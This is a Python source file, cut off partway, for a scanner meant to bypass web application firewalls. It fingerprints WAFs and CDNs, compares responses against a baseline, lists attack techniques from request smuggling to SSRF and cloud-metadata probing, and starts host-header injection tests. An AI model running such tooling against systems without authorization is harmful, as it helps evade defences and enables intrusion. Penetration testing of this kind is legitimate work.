"""
CloudFront WAF Bypass Scanner with Smart Detection and Error Handling
Comprehensive WAF detection, bypass, and reconnaissance toolkit
Optimized for speed and accuracy
"""
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, quote, quote_plus
import time
import hashlib
import logging
import socket
import re
from typing import Optional, List, Dict, Any, Tuple, Set
from functools import lru_cache
import threading

# Suppress InsecureRequestWarning for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from .exceptions import (
    BaselineFailedError,
    InvalidTargetError,
    InvalidSchemeError,
    TargetUnreachableError,
    ScanInterruptedError,
    InvalidThreadCountError,
    InvalidDelayError,
    InvalidTimeoutError,
)
from .error_handler import (
    safe_request,
    validate_url,
    GracefulErrorHandler,
    retry_on_network_error,
)


logger = logging.getLogger(__name__)


# WAF Signature Database
WAF_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid'],
        'cookies': ['__cfduid', '__cf_bm'],
        'server': ['cloudflare'],
        'body_patterns': ['cloudflare', 'cf-ray', 'attention required', 'cloudflare ray id'],
    },
    'aws_waf': {
        'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-cf-pop'],
        'cookies': ['awsalb', 'awsalbcors'],
        'server': ['awselb', 'amazon', 'cloudfront'],
        'body_patterns': ['aws', 'x-amz-', 'request blocked'],
    },
    'akamai': {
        'headers': ['akamai-origin-hop', 'x-akamai-transformed', 'x-akamai-request-id'],
        'cookies': ['akamai_', 'ak_bmsc', 'bm_sv', 'bm_sz'],
        'server': ['akamaighost', 'akamai'],
        'body_patterns': ['akamai', 'access denied', 'reference #'],
    },
    'imperva': {
        'headers': ['x-iinfo', 'x-cdn'],
        'cookies': ['incap_ses_', 'nlbi_', 'visid_incap_'],
        'server': ['imperva', 'incapsula'],
        'body_patterns': ['imperva', 'incapsula', 'incident id', '_incap_'],
    },
    'f5_bigip': {
        'headers': ['x-wa-info'],
        'cookies': ['ts', 'bigipserver', 'f5_cspm', 'f5_st', 'f5avraaaaaaa'],
        'server': ['bigip', 'f5'],
        'body_patterns': ['the requested url was rejected', 'f5 networks', 'bigip'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
        'cookies': ['sucuri_'],
        'server': ['sucuri', 'cloudproxy'],
        'body_patterns': ['sucuri', 'cloudproxy', 'access denied'],
    },
    'modsecurity': {
        'headers': ['x-modsecurity-id'],
        'cookies': [],
        'server': ['modsecurity', 'mod_security'],
        'body_patterns': ['modsecurity', 'mod_security', 'rule id', 'not acceptable'],
    },
    'barracuda': {
        'headers': ['barra_counter_session'],
        'cookies': ['barra_counter_session', 'barracuda_'],
        'server': ['barracuda'],
        'body_patterns': ['barracuda', 'you have been blocked'],
    },
    'fortinet': {
        'headers': ['fortigate', 'fortiwadb'],
        'cookies': ['fgwa', 'fgtauthredirect'],
        'server': ['fortigate', 'fortinet', 'fortiweb'],
        'body_patterns': ['fortinet', 'fortigate', 'web page blocked'],
    },
    'citrix_netscaler': {
        'headers': ['cneonction', 'ns_af'],
        'cookies': ['ns_af', 'citrix_ns_id', 'nsc_'],
        'server': ['netscaler'],
        'body_patterns': ['netscaler', 'citrix', 'ns_af'],
    },
    'radware': {
        'headers': ['x-sl-compstate'],
        'cookies': [],
        'server': ['radware', 'appwall'],
        'body_patterns': ['radware', 'unauthorized activity', 'appwall'],
    },
    'wordfence': {
        'headers': [],
        'cookies': ['wfvt_', 'wordfence_'],
        'server': [],
        'body_patterns': ['wordfence', 'your access to this site has been limited', 'generated by wordfence'],
    },
    'ddos_guard': {
        'headers': ['x-ddos-protection'],
        'cookies': ['__ddg', '__ddgid', '__ddgmark'],
        'server': ['ddos-guard'],
        'body_patterns': ['ddos-guard', 'ddos protection', 'ddos guard'],
    },
    'stackpath': {
        'headers': ['x-sp-waf-nonce', 'x-sp-origin-id'],
        'cookies': [],
        'server': ['stackpath', 'maxcdn'],
        'body_patterns': ['stackpath', 'highwinds', 'maxcdn'],
    },
    'aws_shield': {
        'headers': ['x-amz-cf-id'],
        'cookies': [],
        'server': ['amazon'],
        'body_patterns': ['aws shield', 'request blocked'],
    },
    'azure_front_door': {
        'headers': ['x-azure-ref', 'x-fd-revip'],
        'cookies': [],
        'server': ['azure'],
        'body_patterns': ['azure', 'microsoft', 'access denied'],
    },
    'google_cloud_armor': {
        'headers': ['x-goog-', 'x-cloud-trace-context'],
        'cookies': [],
        'server': ['gws', 'google'],
        'body_patterns': ['google cloud', 'cloud armor', 'denied by security policy'],
    },
    'reblaze': {
        'headers': ['x-rb-', 'rbzid'],
        'cookies': ['rbzid', 'rbz'],
        'server': ['reblaze'],
        'body_patterns': ['reblaze', 'access denied', 'we apologize'],
    },
    'paloalto': {
        'headers': ['x-pan-'],
        'cookies': [],
        'server': ['palo alto'],
        'body_patterns': ['palo alto', 'url filtering', 'block page'],
    },
    'sqreen': {
        'headers': ['x-sqreen-request-id', 'x-sqreen-transaction'],
        'cookies': ['sq_'],
        'server': ['sqreen'],
        'body_patterns': ['sqreen', 'security monitoring', 'blocked by sqreen'],
    },
    'aws_appsync': {
        'headers': ['x-amzn-appsync-', 'x-aws-appsync'],
        'cookies': [],
        'server': ['appsync'],
        'body_patterns': ['appsync', 'graphql', 'x-amzn-requestid'],
    },
    'alibaba_waf': {
        'headers': ['ali-cdn-real-ip', 'x-alicdn-da-ups-status', 'via'],
        'cookies': ['aliyungf_tc', 'acw_tc', '__jsluid'],
        'server': ['aliyun', 'alibaba', 'tengine'],
        'body_patterns': ['aliyun', 'alibaba cloud', 'errors.aliyun', 'blocked by alibaba'],
    },
    'tencent_waf': {
        'headers': ['x-tencent-', 'x-cdn-', 'x-nws-log-uuid'],
        'cookies': ['tencent_', 'qcloud_'],
        'server': ['tencent', 'qcloud', 'cdn-'],
        'body_patterns': ['tencent', 'qcloud', 'blocked by waf', 'cdn.dnsv1.com'],
    },
}

# JavaScript-based WAF/Bot Detection Signatures
JAVASCRIPT_WAF_SIGNATURES = {
    'perimeterx': {
        'script_patterns': ['_px', 'PX', 'perimeterx', 'px-cdn', 'px.js', '/api/v2/collector'],
        'cookies': ['_px', '_pxvid', '_pxhd', '_pxff_', '_px3', '_pxde'],
        'body_patterns': ['perimeterx', 'human challenge', 'px-captcha', 'px-block'],
        'headers': ['x-px-'],
    },
    'datadome': {
        'script_patterns': ['datadome', 'dd.js', '/js/tags.js', 'ddjskey'],
        'cookies': ['datadome', 'datadome-_'],
        'body_patterns': ['datadome', 'dd-verify', 'robot or unusual traffic'],
        'headers': ['x-datadome', 'x-dd-'],
    },
    'human_security': {
        'script_patterns': ['px-client', 'human.js', '/px/client', '_human_'],
        'cookies': ['__cf_bm', '_human', '__h_'],
        'body_patterns': ['human security', 'bot detection', 'automated access'],
        'headers': ['x-human-'],
    },
    'kasada': {
        'script_patterns': ['kasada', '/149e9513-01fa-4fb0-aad4-566afd'],
        'cookies': ['x-kpsdk', 'kpsdk', '_kp_'],
        'body_patterns': ['kasada', 'bot protection'],
        'headers': ['x-kpsdk-'],
    },
    'shape_security': {
        'script_patterns': ['shape', '/api/p.js', 'shape-security'],
        'cookies': ['_abck', 'bm_', 'ak_bmsc'],
        'body_patterns': ['shape security', 'f5 shape'],
        'headers': ['x-shape-'],
    },
    'distil': {
        'script_patterns': ['distil', 'd-', 'distilidentifier'],
        'cookies': ['D_', 'distilidentifier', 'd_'],
        'body_patterns': ['distil', 'distil networks', 'imperva'],
        'headers': ['x-distil-'],
    },
}

# OWASP CRS Version Signatures
OWASP_CRS_SIGNATURES = {
    'crs_3.3': {
        'patterns': ['CRS3.3', 'ModSecurity Core Rule Set 3.3', 'sec-rule-id-9'],
        'rule_ids': [920, 930, 940, 941, 942, 943, 944],
    },
    'crs_3.2': {
        'patterns': ['CRS3.2', 'ModSecurity Core Rule Set 3.2'],
        'rule_ids': [920, 930, 940, 941, 942, 943],
    },
    'crs_3.1': {
        'patterns': ['CRS3.1', 'ModSecurity Core Rule Set 3.1'],
        'rule_ids': [920, 930, 940, 941, 942],
    },
    'crs_3.0': {
        'patterns': ['CRS3.0', 'ModSecurity Core Rule Set 3.0'],
        'rule_ids': [920, 930, 940, 941],
    },
    'crs_2.x': {
        'patterns': ['CRS2', 'ModSecurity Core Rule Set 2', 'modsec2'],
        'rule_ids': [950, 960, 970, 981],
    },
}

# Technology Stack Signatures
TECHNOLOGY_SIGNATURES = {
    'frameworks': {
        'django': {'headers': ['x-frame-options'], 'cookies': ['csrftoken', 'sessionid'], 'patterns': ['django', 'csrfmiddlewaretoken']},
        'flask': {'headers': [], 'cookies': ['session'], 'patterns': ['werkzeug', 'flask']},
        'rails': {'headers': ['x-runtime', 'x-request-id'], 'cookies': ['_session_id'], 'patterns': ['rails', 'ruby']},
        'laravel': {'headers': [], 'cookies': ['laravel_session', 'XSRF-TOKEN'], 'patterns': ['laravel', 'blade']},
        'express': {'headers': ['x-powered-by'], 'cookies': ['connect.sid'], 'patterns': ['express']},
        'spring': {'headers': ['x-application-context'], 'cookies': ['JSESSIONID'], 'patterns': ['spring', 'java']},
        'aspnet': {'headers': ['x-aspnet-version', 'x-aspnetmvc-version'], 'cookies': ['.aspnet', 'asp.net_sessionid'], 'patterns': ['asp.net', '__viewstate', '__eventvalidation']},
        'nextjs': {'headers': ['x-nextjs-'], 'cookies': ['__next'], 'patterns': ['_next/', 'next.js']},
        'nuxt': {'headers': [], 'cookies': [], 'patterns': ['nuxt', '_nuxt/']},
    },
    'cms': {
        'wordpress': {'patterns': ['wp-content', 'wp-admin', 'wp-includes', 'wordpress'], 'cookies': ['wordpress_', 'wp-']},
        'drupal': {'patterns': ['drupal', '/sites/default/', 'node/'], 'cookies': ['SSESS', 'Drupal']},
        'joomla': {'patterns': ['joomla', '/administrator/', '/components/'], 'cookies': ['joomla']},
        'magento': {'patterns': ['magento', '/mage/', 'varien'], 'cookies': ['PHPSESSID', 'frontend']},
        'shopify': {'patterns': ['shopify', 'cdn.shopify.com'], 'cookies': ['_shopify']},
    },
    'servers': {
        'nginx': {'patterns': ['nginx']},
        'apache': {'patterns': ['apache', 'httpd']},
        'iis': {'patterns': ['iis', 'microsoft']},
        'tomcat': {'patterns': ['tomcat', 'apache-coyote']},
        'gunicorn': {'patterns': ['gunicorn']},
        'uvicorn': {'patterns': ['uvicorn']},
    },
    'languages': {
        'php': {'headers': ['x-powered-by'], 'patterns': ['php/', '.php', 'phpsessid']},
        'python': {'patterns': ['python', 'wsgi', 'gunicorn', 'uvicorn']},
        'java': {'patterns': ['java', 'jsessionid', 'servlet']},
        'ruby': {'patterns': ['ruby', 'rails', 'rack']},
        'nodejs': {'patterns': ['node', 'express', 'x-powered-by: express']},
        'dotnet': {'patterns': ['.net', 'asp.net', 'x-aspnet']},
    },
}

# CDN Signatures
CDN_SIGNATURES = {
    'cloudflare': {
        'headers': ['cf-ray', 'cf-cache-status'],
        'server': ['cloudflare'],
        'cnames': ['cloudflare.com', 'cloudflare-dns.com'],
    },
    'akamai': {
        'headers': ['x-akamai-transformed'],
        'server': ['akamaighost'],
        'cnames': ['akamai.net', 'akamaiedge.net', 'akamaized.net'],
    },
    'cloudfront': {
        'headers': ['x-amz-cf-id', 'x-amz-cf-pop'],
        'server': ['amazon', 'cloudfront'],
        'cnames': ['cloudfront.net', 'amazonaws.com'],
    },
    'fastly': {
        'headers': ['x-served-by', 'x-fastly-request-id'],
        'server': ['fastly'],
        'cnames': ['fastly.net', 'fastlylb.net'],
    },
    'maxcdn': {
        'headers': ['x-maxcdn'],
        'server': ['netdna', 'maxcdn'],
        'cnames': ['netdna.com', 'maxcdn.com'],
    },
    'keycdn': {
        'headers': ['x-pull'],
        'server': ['keycdn'],
        'cnames': ['keycdn.com', 'kxcdn.com'],
    },
    'stackpath': {
        'headers': ['x-sp-origin-id'],
        'server': ['stackpath'],
        'cnames': ['stackpath.com', 'stackpathdns.com'],
    },
    'incapsula': {
        'headers': ['x-iinfo'],
        'server': ['incapsula'],
        'cnames': ['incapdns.net', 'impervadns.net'],
    },
    'sucuri': {
        'headers': ['x-sucuri-id'],
        'server': ['sucuri'],
        'cnames': ['sucuri.net'],
    },
    'azure_cdn': {
        'headers': ['x-azure-ref'],
        'server': ['azure'],
        'cnames': ['azureedge.net', 'azure.net'],
    },
    'google_cdn': {
        'headers': ['x-goog-'],
        'server': ['google', 'gws'],
        'cnames': ['googleusercontent.com', 'googlevideo.com'],
    },
    'bunnycdn': {
        'headers': ['bunny-server-header'],
        'server': ['bunny'],
        'cnames': ['bunny.net', 'b-cdn.net'],
    },
}

# Pre-compile regex patterns for performance
ERROR_PATTERNS = re.compile(
    r'(exception|traceback|stack\s*trace|sql\s*syntax|mysql_|postgresql|ora-\d+|'
    r'internal\s*server\s*error|500\s*internal|debug\s*mode|fatal\s*error|warning:)',
    re.IGNORECASE
)

BACKEND_PATTERNS = re.compile(
    r'(apache|nginx|iis|tomcat|jetty|gunicorn|uwsgi)',
    re.IGNORECASE
)


class CloudFrontBypasser:
    """Optimized WAF Bypass Scanner with connection pooling and smart detection"""
    
    # Class-level session pool for connection reuse
    _session_pool: Dict[str, requests.Session] = {}
    _session_lock = threading.Lock()
    
    def __init__(self, target: str, threads: int = 10, delay: float = 0.2, timeout: int = 5):
        """
        Initialize CloudFront WAF Bypasser
        
        Args:
            target: Target URL to scan
            threads: Number of concurrent threads
            delay: Delay between requests (seconds)
            timeout: Request timeout (seconds)
        
        Raises:
            InvalidTargetError: If target URL is invalid
            InvalidThreadCountError: If threads is not positive
            InvalidDelayError: If delay is negative
            InvalidTimeoutError: If timeout is not positive
        """
        # Validate inputs
        self._validate_inputs(target, threads, delay, timeout)
        
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.results = []
        self._results_lock = threading.Lock()
        
        # Baseline tracking
        self._baseline_size = None
        self._baseline_hash = None
        self._baseline_status = None
        self._baseline_headers = {}
        self._baseline_body_sample = ""
        
        # Response cache to avoid duplicate requests
        self._response_cache: Dict[str, Dict] = {}
        self._cache_lock = threading.Lock()
        
        # Parse target
        try:
            parsed = urlparse(self.target)
            self.domain = parsed.netloc
            self.scheme = parsed.scheme
            
            if not self.domain:
                raise InvalidTargetError(
                    "Invalid target URL: missing domain",
                    details={'target': target}
                )
        except Exception as e:
            raise InvalidTargetError(
                f"Failed to parse target URL: {str(e)}",
                details={'target': target}
            )
        
        # Initialize optimized session with connection pooling
        self._session = self._get_optimized_session()
        
        logger.info(f"Initialized scanner for {self.target}")
    
    def _get_optimized_session(self) -> requests.Session:
        """Create an optimized session with connection pooling and retry logic"""
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[500, 502, 503, 504],
        )
        
        # Mount adapters with connection pooling
        adapter = HTTPAdapter(
            pool_connections=self.threads,
            pool_maxsize=self.threads * 2,
            max_retries=retry_strategy
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        # Disable SSL warnings for speed
        session.verify = False
        
        return session
    
    def _validate_inputs(self, target: str, threads: int, delay: float, timeout: int) -> None:
        """Validate all input parameters"""
        # Validate URL
        is_valid, error_msg = validate_url(target)
        if not is_valid:
            raise InvalidTargetError(error_msg, details={'target': target})
        
        # Validate scheme
        parsed = urlparse(target)
        if parsed.scheme not in ['http', 'https']:
            raise InvalidSchemeError(
                f"Invalid scheme '{parsed.scheme}'. Must be http or https",
                details={'target': target, 'scheme': parsed.scheme}
            )
        
        # Validate threads
        if not isinstance(threads, int) or threads <= 0:
            raise InvalidThreadCountError(
                f"Thread count must be positive integer, got: {threads}",
                details={'threads': threads}
            )
        
        # Validate delay
        if not isinstance(delay, (int, float)) or delay < 0:
            raise InvalidDelayError(
                f"Delay must be non-negative number, got: {delay}",
                details={'delay': delay}
            )
        
        # Validate timeout
        if not isinstance(timeout, (int, float)) or timeout <= 0:
            raise InvalidTimeoutError(
                f"Timeout must be positive number, got: {timeout}",
                details={'timeout': timeout}
            )
    
    def scan(self) -> List[Dict[str, Any]]:
        """
        Run all bypass techniques
        
        Returns:
            List of successful bypass results
        
        Raises:
            BaselineFailedError: If baseline cannot be established
            TargetUnreachableError: If target is completely unreachable
            ScanInterruptedError: If scan is interrupted
        """
        logger.info(f"Starting scan of {self.target}")
        print(f"[*] Scanning {self.target}")
        
        # Establish baseline first
        print("[*] Establishing baseline...")
        try:
            baseline = self._get_baseline()
            if not baseline:
                raise BaselineFailedError(
                    "Failed to establish baseline - target may be down",
                    details={'target': self.target}
                )
            
            self._baseline_size = len(baseline.content)
            self._baseline_hash = hashlib.md5(baseline.content).hexdigest()
            self._baseline_status = baseline.status_code
            self._baseline_headers = dict(baseline.headers)
            
            logger.info(
                f"Baseline established: {self._baseline_status} | "
                f"{self._baseline_size} bytes | {self._baseline_hash[:8]}"
            )
            print(f"[+] Baseline: {self._baseline_status} | Size: {self._baseline_size} bytes")
        
        except BaselineFailedError:
            raise
        except TargetUnreachableError:
            raise
        except Exception as e:
            logger.error(f"Unexpected error during baseline: {e}")
            raise BaselineFailedError(
                f"Baseline failed: {str(e)}",
                details={'target': self.target, 'error': str(e)}
            )
        
        print(f"[*] Testing bypass techniques...\n")
        
        # Run WAF Detection first
        print("[*] Phase 1: WAF Detection & Fingerprinting...")
        waf_results = self._detect_waf()
        if waf_results:
            self.results.extend(waf_results)
        
        cdn_results = self._detect_cdn()
        if cdn_results:
            self.results.extend(cdn_results)
        
        print("\n[*] Phase 2: Testing bypass techniques...")
        
        # Define all techniques - organized by category
        techniques = [
            # === Header-Based Bypass Scans ===
            self._test_host_header_injection,
            self._test_x_forwarded_for,
            self._test_x_forwarded_host,
            self._test_x_original_url,
            self._test_header_injection,
            self._test_origin_header_bypass,
            self._test_custom_header_fuzzing,
            
            # === Encoding Bypass Scans ===
            self._test_encoding_bypass,
            self._test_double_encoding,
            self._test_case_manipulation,
            self._test_comment_injection,
            self._test_whitespace_manipulation,
            
            # === HTTP Method & Protocol Scans ===
            self._test_method_bypass,
            self._test_http_method_override,
            self._test_content_type_bypass,
            self._test_http_parameter_pollution,
            
            # === Protocol-Level Scans ===
            self._test_transfer_encoding_smuggling,
            self._test_http2_downgrade,
            self._test_websocket_upgrade,
            self._test_chunked_transfer,
            self._test_http_pipelining,
            
            # === Cache & Control Scans ===
            self._test_cache_control,
            self._test_range_header,
            self._test_cache_poisoning,
            
            # === Payload-Based Bypass Scans ===
            self._test_sqli_bypass,
            self._test_xss_bypass,
            self._test_command_injection_bypass,
            self._test_path_traversal_bypass,
            self._test_ssrf_bypass,
            
            # === Rate Limit & Threshold Testing ===
            self._test_rate_limit_detection,
            
            # === Miscellaneous Scans ===
            self._test_ipv6_bypass,
            self._test_bot_detection_evasion,
            self._test_api_endpoint_discovery,
            
            # === Extended Detection & Scanning ===
            self._detect_waf_rule_version,
            self._detect_javascript_waf,
            self._test_graphql_bypass,
            self._test_jwt_oauth_bypass,
            
            # === Advanced Attack Techniques ===
            self._test_request_smuggling_v2,
            self._test_payload_mutation,
            self._test_polyglot_payloads,
            self._test_time_based_detection,
            self._test_race_condition,
            
            # === Reconnaissance Features ===
            self._enumerate_subdomains,
            self._historical_dns_lookup,
            self._certificate_transparency_lookup,
            self._test_cloud_metadata_enumeration,
            self._fingerprint_technology_stack,
        ]
        
        # Execute techniques with error handling
        error_count = 0
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {executor.submit(technique): technique.__name__ for technique in techniques}
                
                for future in as_completed(futures):
                    technique_name = futures[future]
                    try:
                        result = future.result()
                        if result:
                            self.results.extend(result)
                    except KeyboardInterrupt:
                        logger.warning("Scan interrupted by user")
                        raise ScanInterruptedError("Scan interrupted by user")
                    except Exception as e:
                        error_count += 1
                        logger.error(f"Error in {technique_name}: {e}")
                        # Continue with other techniques
        
        except KeyboardInterrupt:
            logger.warning("Scan interrupted by user")
            raise ScanInterruptedError("Scan interrupted by user")
        
        if error_count > 0:
            logger.warning(f"Scan completed with {error_count} technique errors")
            print(f"\n[!] Warning: {error_count} techniques encountered errors")
        
        logger.info(f"Scan complete: Found {len(self.results)} bypasses")
        return self.results
    
    @retry_on_network_error(max_retries=3, backoff_factor=0.5)
    def _get_baseline(self) -> Optional[requests.Response]:
        """
        Get baseline response for comparison with retry logic
        
        Returns:
            Response object or None
        
        Raises:
            TargetUnreachableError: If target cannot be reached after retries
        """
        try:
            resp = safe_request(
                self.target,
                timeout=self.timeout,
                allow_redirects=False
            )
            return resp
        except Exception as e:
            logger.error(f"Baseline request failed: {e}")
            raise
    
    def _test_request(
        self,
        headers: Optional[dict] = None,
        method: str = 'GET',
        path: str = '/'
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single request configuration with error handling
        
        Args:
            headers: Request headers
            method: HTTP method
            path: URL path
        
        Returns:
            Result dictionary or None if request failed
        """
        url = f"{self.target}{path}"
        
        # Generate cache key for deduplication
        cache_key = f"{method}:{path}:{hash(frozenset((headers or {}).items()))}"
        
        # Check cache first
        with self._cache_lock:
            if cache_key in self._response_cache:
                return self._response_cache[cache_key]
        
        try:
            # Use session for connection pooling
            req_headers = dict(self._session.headers)
            if headers:
                req_headers.update(headers)
            
            resp = self._session.request(
                method=method,
                url=url,
                headers=req_headers,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            
            if resp is None:
                return None
            
            # Rate limiting - reduced for speed
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Check if bypass succeeded
            bypass_result = self._is_bypass_fast(resp)
            
            result = {
                'bypass': bypass_result['bypass'],
                'status': resp.status_code,
                'headers': {k: v for k, v in (headers or {}).items() if k != 'X-Technique'},
                'method': method,
                'path': path,
                'size': len(resp.content),
                'technique': headers.get('X-Technique', 'Unknown') if headers else 'Unknown',
                'reason': bypass_result['reason'],
                'severity': bypass_result['severity']
            }
            
            # Cache result
            with self._cache_lock:
                self._response_cache[cache_key] = result
            
            return result
            
        except requests.exceptions.Timeout:
            logger.debug(f"Timeout for {method} {path}")
            return None
        except requests.exceptions.ConnectionError:
            logger.debug(f"Connection error for {method} {path}")
            return None
        except Exception as e:
            logger.debug(f"Request failed for {method} {path}: {e}")
            return None
    
    def _is_bypass_fast(self, response: requests.Response) -> Dict[str, Any]:
        """Optimized bypass detection with pre-compiled patterns"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        status = response.status_code
        
        # Quick rejection: error responses are NOT bypasses
        if status >= 400:
            return {'bypass': False, 'reason': f'Blocked: {status}', 'severity': 'INFO'}
        
        try:
            content = response.content
            current_size = len(content)
            
            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401, 429] and status == 200:
                return {
                    'bypass': True,
                    'reason': f'Auth bypass: {self._baseline_status} → {status}',
                    'severity': 'CRITICAL'
                }
            
            # Quick size comparison
            if self._baseline_size > 0:
                size_diff = abs(current_size - self._baseline_size)
                size_diff_percent = (size_diff / self._baseline_size) * 100
                
                # HIGH: Significant size difference (>15% change)
                if size_diff_percent > 15 and size_diff > 200:
                    return {
                        'bypass': True,
                        'reason': f'Content diff: {size_diff_percent:.0f}% change',
                        'severity': 'HIGH'
                    }
            
            # Only compute hash if size is similar (optimization)
            if abs(current_size - self._baseline_size) < 500:
                current_hash = hashlib.md5(content).hexdigest()
                if current_hash != self._baseline_hash:
                    return {
                        'bypass': True,
                        'reason': 'Different content (hash mismatch)',
                        'severity': 'HIGH'
                    }
            
            # Check response body for error indicators (first 3KB only for speed)
            body_sample = response.text[:3000].lower() if current_size > 0 else ""
            
            # Use pre-compiled regex for speed
            if ERROR_PATTERNS.search(body_sample):
                match = ERROR_PATTERNS.search(body_sample)
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: {match.group(1)}',
                    'severity': 'CRITICAL' if 'sql' in match.group(1).lower() or 'exception' in match.group(1).lower() else 'HIGH'
                }
            
            # Check headers (fast dict lookups)
            resp_headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            # Backend server header exposed
            server = resp_headers_lower.get('server', '').lower()
            if server and BACKEND_PATTERNS.search(server):
                baseline_server = self._baseline_headers.get('server', '').lower()
                if not BACKEND_PATTERNS.search(baseline_server):
                    return {
                        'bypass': True,
                        'reason': f'Backend server: {response.headers.get("server")}',
                        'severity': 'MEDIUM'
                    }
            
            # X-Powered-By exposed
            if 'x-powered-by' in resp_headers_lower and 'x-powered-by' not in self._baseline_headers:
                return {
                    'bypass': True,
                    'reason': f'Tech exposed: {resp_headers_lower["x-powered-by"]}',
                    'severity': 'MEDIUM'
                }
            
            return {'bypass': False, 'reason': 'No bypass detected', 'severity': 'INFO'}
            
        except Exception as e:
            logger.debug(f"Bypass detection error: {e}")
            return {'bypass': False, 'reason': 'Detection error', 'severity': 'INFO'}
    
    def _is_bypass(self, response: requests.Response) -> Dict[str, Any]:
        """Determine if response indicates WAF bypass with detailed reasoning"""
        
        if self._baseline_size is None:
            return {'bypass': False, 'reason': 'No baseline', 'severity': 'INFO'}
        
        # Ignore error responses (4xx, 5xx) - these are NOT bypasses
        if response.status_code >= 400:
            return {'bypass': False, 'reason': f'Blocked: {response.status_code}', 'severity': 'INFO'}
        
        try:
            current_size = len(response.content)
            current_hash = hashlib.md5(response.content).hexdigest()
            size_diff = abs(current_size - self._baseline_size)
            size_diff_percent = (size_diff / self._baseline_size) * 100 if self._baseline_size > 0 else 0
            #This is evil code fellas >;)
            # CRITICAL: Status code changed from blocked to allowed
            if self._baseline_status in [403, 401] and response.status_code == 200:
                return {
                    'bypass': True,
                    'reason': f'Authentication bypass: {self._baseline_status} → {response.status_code}',
                    'severity': 'CRITICAL'
                }
            
            # HIGH: Significant size difference (different content)
            if size_diff_percent > 10:
                return {
                    'bypass': True,
                    'reason': f'Content difference: {size_diff} bytes ({size_diff_percent:.1f}% change)',
                    'severity': 'HIGH'
                }
            
            # HIGH: Different content hash (even if size similar)
            if current_hash != self._baseline_hash and size_diff > 100:
                return {
                    'bypass': True,
                    'reason': 'Different content returned (hash mismatch)',
                    'severity': 'HIGH'
                }
            
            # CRITICAL: Backend error exposed - use pre-compiled regex
            body_lower = response.text[:5000].lower()
            match = ERROR_PATTERNS.search(body_lower)
            if match:
                severity = 'CRITICAL' if match.group(1) in ['exception', 'traceback', 'sql syntax', 'mysql_', 'postgresql'] else 'HIGH'
                return {
                    'bypass': True,
                    'reason': f'Backend exposed: "{match.group(1)}" found',
                    'severity': severity
                }
            
            # MEDIUM: Backend server header exposed
            if 'server' in response.headers:
                server = response.headers['server'].lower()
                if BACKEND_PATTERNS.search(server):
                    baseline_server = self._baseline_headers.get('server', '').lower()
                    if not BACKEND_PATTERNS.search(baseline_server):
                        return {
                            'bypass': True,
                            'reason': f'Backend server exposed: {response.headers["server"]}',
                            'severity': 'MEDIUM'
                        }
            
            # MEDIUM: X-Powered-By header exposed
            if 'x-powered-by' in response.headers:
                if 'x-powered-by' not in self._baseline_headers:
                    return {
                        'bypass': True,
                        'reason': f'Backend tech exposed: {response.headers["x-powered-by"]}',
                        'severity': 'MEDIUM'
                    }
            
            # MEDIUM: Different redirect location
            if response.status_code in [301, 302, 307, 308]:
                baseline_location = self._baseline_headers.get('location', '')
                current_location = response.headers.get('location', '')
                if current_location and current_location != baseline_location:
                    return {
                        'bypass': True,
                        'reason': f'Different redirect: {current_location}',
                        'severity': 'MEDIUM'
                    }
            
            # No bypass detected
            return {'bypass': False, 'reason': 'Response identical to baseline', 'severity': 'INFO'}
        
        except Exception as e:
            logger.error(f"Error in bypass detection: {e}")
            return {'bypass': False, 'reason': f'Detection error: {str(e)}', 'severity': 'INFO'}
    
    def _batch_test(self, test_cases: List[Dict], method: str = 'GET', verbose: bool = True) -> List[Dict[str, Any]]:
        """
        Optimized batch testing - run multiple tests in parallel
        
        Args:
            test_cases: List of dicts with 'headers', 'path', and optional 'technique' keys
            method: HTTP method to use
            verbose: Whether to print bypass results
        
        Returns:
            List of bypass results
        """
        results = []
        
        def run_single_test(test_case):
            headers = test_case.get('headers', {}).copy()
            path = test_case.get('path', '/')
            technique = test_case.get('technique', headers.get('X-Technique', 'Unknown'))
            
            if 'X-Technique' not in headers:
                headers['X-Technique'] = technique
            
            return self._test_request(headers, method=method, path=path)
        
        # Use thread pool for parallel execution within batch
        with ThreadPoolExecutor(max_workers=min(len(test_cases), self.threads)) as executor:
            futures = {executor.submit(run_single_test, tc): tc for tc in test_cases}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        results.append(result)
                        if verbose and result.get('bypass'):
                            print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
                except Exception as e:
                    logger.debug(f"Batch test error: {e}")
        
        return results

    def _test_host_header_injection(self) -> List[Dict[str, Any]]:
        """Test Host header manipulation - optimized batch"""
        test_cases = [
            {'headers': {'Host': 'localhost'}, 'technique': 'Host: localhost'},
            {'headers': {'Host': '127.0.0.1'}, 'technique': 'Host: 127.0.0.1'},
            {'headers': {'Host': f'{self.domain}:80'}, 'technique': f'Host: {self.domain}:80'},
            {'headers': {'Host': f'{self.domain}:443'}, 'technique': f'Host: {self.domain}:443'},
        ]
